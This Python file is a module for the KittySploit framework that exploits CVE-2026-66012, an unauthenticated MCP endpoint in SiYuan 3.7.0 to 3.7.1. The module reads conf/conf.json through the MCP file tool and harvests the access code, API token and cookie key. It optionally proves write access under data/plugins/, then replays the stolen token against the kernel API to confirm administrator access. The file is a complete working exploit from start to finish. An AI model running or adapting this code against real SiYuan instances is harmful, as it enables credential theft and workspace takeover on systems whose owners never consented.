#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-66012 — SiYuan unauthenticated MCP workspace file read/write."""

import json
import uuid

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "SiYuan MCP Auth Bypass (CVE-2026-66012)",
        "description": (
            "CVE-2026-66012 in SiYuan kernel 3.7.0 <= v < 3.7.2 (fixed 3.7.2): POST /mcp on the Publish "
            "port checks auth presence only and accepts RoleReader. With anonymous Publish mode "
            "(Conf.Publish.Enable=true, Conf.Publish.Auth.Enable=false) all MCP tools including "
            "file read/write reach the workspace without credentials. Reads conf/conf.json for "
            "accessAuthCode, api.token and cookieKey; optionally proves write under data/plugins/ "
            "and replays api.token on the kernel API port."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-66012"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-66012",
            "https://www.cve.org/CVERecord?id=CVE-2026-66012",
        ],
        "tags": [
            "siyuan",
            "mcp",
            "auth-bypass",
            "file-read",
            "file-write",
            "credentials",
            "cve-2026-66012",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths", "risk_signals"],
            "cost": 1.5,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["siyuan"],
                "endpoint_pattern_any": ["/mcp"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "anonymous MCP"},
                    {"capability": "file_read", "from_detail": "workspace file tool"},
                    {"capability": "credentials", "from_detail": "conf/conf.json secrets"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(6808, "SiYuan Publish proxy port (unauthenticated MCP)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    mcp_path = OptString("/mcp", "MCP HTTP endpoint path", False)
    target_file = OptString(
        "conf/conf.json",
        "Workspace-relative file to read via the MCP file tool",
        False,
    )
    kernel_port = OptInteger(
        6806,
        "Kernel API port for admin token replay (0 = skip)",
        False,
        advanced=True,
    )
    write_proof = OptBool(
        True,
        "Write and read back a marker under data/plugins/, then delete it",
        False,
    )

    def __init__(self, framework=None):
        super().__init__(framework)
        self._mcp_mode = None
        self._mcp_session_id = None

    def _endpoint(self) -> str:
        base = (self.path or "/").rstrip("/")
        suffix = str(self.mcp_path or "/mcp")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _kernel_path(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _parse_mcp_body(self, response):
        if not response:
            return None
        text = (response.text or "").strip()
        if text.startswith("data:"):
            lines = [line[5:].strip() for line in text.splitlines() if line.startswith("data:")]
            text = "".join(lines)
        if not text:
            return None
        try:
            return json.loads(text)
        except ValueError:
            return None

    def _mcp_post(self, payload: dict, extra: dict = None):
        headers = {
            "Accept": "application/json, text/event-stream",
            "Accept-Encoding": "identity",
        }
        if extra:
            headers.update(extra)
        response = self.http_request(
            method="POST",
            path=self._endpoint(),
            json=payload,
            headers=headers,
            session=True,
            allow_redirects=False,
            timeout=int(self.timeout or 15),
        )
        code = int(response.status_code or 0) if response else 0
        session_id = None
        if response and response.headers:
            session_id = response.headers.get("Mcp-Session-Id") or response.headers.get("mcp-session-id")
        return code, session_id, self._parse_mcp_body(response), response

    def _mcp_handshake(self) -> bool:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2025-06-18",
                "capabilities": {},
                "clientInfo": {"name": "kittysploit", "version": "1.0"},
            },
        }
        code, session_id, _parsed, _resp = self._mcp_post(payload)
        if code != 200:
            return False
        if session_id:
            self._mcp_session_id = session_id
        return True

    def _mcp_rpc(self, method: str, params=None, rid: int = 1):
        payload = {"jsonrpc": "2.0", "id": rid, "method": method}
        if params is not None:
            payload["params"] = params

        if self._mcp_mode in (None, "2026"):
            code, _sid, parsed, resp = self._mcp_post(
                payload,
                {"MCP-Protocol-Version": "2026-07-28"},
            )
            if code == 200:
                self._mcp_mode = "2026"
                return code, parsed, resp
            if self._mcp_mode == "2026" or code in (401, 403):
                return code, parsed, resp

        if not self._mcp_session_id and not self._mcp_handshake():
            return 0, None, None
        self._mcp_mode = "classic"
        extra = {"Mcp-Session-Id": self._mcp_session_id} if self._mcp_session_id else {}
        code, _sid, parsed, resp = self._mcp_post(payload, extra)
        return code, parsed, resp

    def _tools_list(self):
        code, parsed, _resp = self._mcp_rpc("tools/list", rid=1)
        tools = []
        if isinstance(parsed, dict):
            tools = (parsed.get("result") or {}).get("tools") or []
        return code, tools

    def _file_tool(self, action: str, rid: int = 2, **arguments):
        arguments["action"] = action
        code, parsed, resp = self._mcp_rpc(
            "tools/call",
            {"name": "file", "arguments": arguments},
            rid=rid,
        )
        if not isinstance(parsed, dict):
            return code, None, True, resp
        result = parsed.get("result") or {}
        is_error = bool(result.get("isError")) if isinstance(result, dict) else True
        text = None
        content = result.get("content") if isinstance(result, dict) else None
        if isinstance(content, list) and content and isinstance(content[0], dict):
            text = content[0].get("text")
        return code, text, is_error, resp

    def _harvest(self, conf_text: str) -> dict:
        try:
            conf = json.loads(conf_text)
        except (ValueError, TypeError):
            return {}
        if not isinstance(conf, dict):
            return {}
        out = {}
        if isinstance(conf.get("accessAuthCode"), str):
            out["accessAuthCode"] = conf["accessAuthCode"]
        if isinstance(conf.get("cookieKey"), str):
            out["cookieKey"] = conf["cookieKey"]
        api = conf.get("api")
        if isinstance(api, dict) and isinstance(api.get("token"), str):
            out["token"] = api["token"]
        return out

    def _kernel_api(self, endpoint: str, token: str = ""):
        kernel = int(self.kernel_port or 0)
        if kernel <= 0:
            return 0, ""
        publish = int(self.port or 6808)
        port_opt = getattr(type(self), "port", None)
        headers = {"Accept-Encoding": "identity"}
        if token:
            headers["Authorization"] = f"Token {token}"
        try:
            if port_opt and hasattr(port_opt, "__set__"):
                port_opt.__set__(self, kernel)
            response = self.http_request(
                method="POST",
                path=self._kernel_path(endpoint),
                json={},
                headers=headers,
                session=False,
                allow_redirects=False,
                timeout=int(self.timeout or 15),
            )
            return (
                int(response.status_code or 0) if response else 0,
                (response.text or "") if response else "",
            )
        finally:
            if port_opt and hasattr(port_opt, "__set__"):
                port_opt.__set__(self, publish)

    def check(self):
        code, tools = self._tools_list()
        if not tools:
            text = ""
            if code in (401, 403):
                return {
                    "vulnerable": False,
                    "reason": f"MCP blocked (HTTP {code}) — patched or auth required",
                    "confidence": "high",
                }
            return {
                "vulnerable": False,
                "reason": f"no MCP tool list (HTTP {code})",
                "confidence": "medium",
            }

        names = [t.get("name") for t in tools if isinstance(t, dict)]
        result = {
            "vulnerable": True,
            "reason": f"{len(tools)} MCP tools reachable without credentials",
            "confidence": "high",
            "tools": names,
            "http_code": code,
        }
        if "file" in names:
            path = str(self.target_file or "conf/conf.json")
            _c, text, err, _r = self._file_tool("read", rid=2, path=path, limit=-1)
            if not err and text:
                result["file_path"] = path
                result["file_bytes"] = len(text)
                result["secrets"] = self._harvest(text)
                if path != "conf/conf.json" and not result["secrets"]:
                    _c2, conf_text, err2, _r2 = self._file_tool(
                        "read", rid=3, path="conf/conf.json", limit=-1
                    )
                    if not err2 and conf_text:
                        result["secrets"] = self._harvest(conf_text)
                        result["conf_path"] = "conf/conf.json"
        return result

    def run(self):
        try:
            print_status("CVE-2026-66012 — SiYuan unauthenticated MCP access")
            print_info(f"POST {self._endpoint()} (no credentials — Publish anonymous JWT)")

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "Target does not appear vulnerable"))
                return False

            tools = result.get("tools") or []
            print_success(result.get("reason", "Target appears vulnerable"))
            print_info(f"Tools: {', '.join(sorted(t for t in tools if t))}")

            if "file" not in tools:
                print_warning("No file tool — auth bypass confirmed but workspace R/W unavailable")
                return True

            path = str(self.target_file or "conf/conf.json")
            print_status(f"Reading {path} via MCP file tool")
            _code, text, is_error, _resp = self._file_tool("read", rid=2, path=path, limit=-1)
            if is_error or text is None:
                print_error(f"Could not read {path}")
                return True

            print_success(f"Read {len(text)} bytes from {path}")
            excerpt = text if len(text) <= 1800 else f"{text[:900]}\n...\n{text[-900:]}"
            print_info(excerpt)

            secrets = self._harvest(text)
            if not secrets and path != "conf/conf.json":
                print_status("Harvesting conf/conf.json for credentials")
                _c, conf_text, err, _r = self._file_tool(
                    "read", rid=3, path="conf/conf.json", limit=-1
                )
                if not err and conf_text:
                    secrets = self._harvest(conf_text)
                    print_info(f"conf/conf.json ({len(conf_text)} bytes)")

            if secrets:
                if "accessAuthCode" in secrets:
                    print_info(f"accessAuthCode: {secrets['accessAuthCode'] or '<empty>'}")
                if "token" in secrets:
                    print_info(f"api.token     : {secrets['token']}")
                if "cookieKey" in secrets:
                    print_info(f"cookieKey     : {secrets['cookieKey']}")

            if self.write_proof:
                marker = f"alim-{uuid.uuid4().hex[:10]}"
                marker_dir = f"data/plugins/{marker}"
                marker_path = f"{marker_dir}/index.js"
                payload = f"// CVE-2026-66012 write proof {marker}"
                print_status(f"Writing {marker_path}")
                _wcode, wtext, werr, _wraw = self._file_tool(
                    "write", rid=4, path=marker_path, data=payload
                )
                if werr:
                    print_warning(f"Write failed: {wtext}")
                else:
                    _bcode, back, berr, _braw = self._file_tool(
                        "read", rid=5, path=marker_path, limit=-1
                    )
                    if not berr and back and back.strip() == payload.strip():
                        print_success("Write round-trip confirmed under data/plugins/")
                    else:
                        print_warning("Write accepted but read-back mismatch")
                    _dcode, dtext, derr, _draw = self._file_tool(
                        "delete", rid=6, path=marker_dir
                    )
                    if not derr:
                        print_info(f"Cleanup: deleted {marker_dir}")
                    else:
                        print_warning(f"Cleanup failed for {marker_dir}")

            token = (secrets or {}).get("token")
            kernel = int(self.kernel_port or 0)
            if token and kernel > 0:
                print_status(
                    f"Replaying stolen api.token on kernel port {kernel} (/api/system/getConf)"
                )
                auth_code, auth_body = self._kernel_api("/api/system/getConf", token=token)
                anon_code, anon_body = self._kernel_api("/api/system/getConf", token="")
                print_info(f"with token    : HTTP {auth_code} {auth_body[:200]}")
                print_info(f"without token : HTTP {anon_code} {anon_body[:200]}")
                if auth_code == 200 and '"code":0' in auth_body:
                    print_success("Stolen api.token accepted as Administrator on kernel API")

            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
